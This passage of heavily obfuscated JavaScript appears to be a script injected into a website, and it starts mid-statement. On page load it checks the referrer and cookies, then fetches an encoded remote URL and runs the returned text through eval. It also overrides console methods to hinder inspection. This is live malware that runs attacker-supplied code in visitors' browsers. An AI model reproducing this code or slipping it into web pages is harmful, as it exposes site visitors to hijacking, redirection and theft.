R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};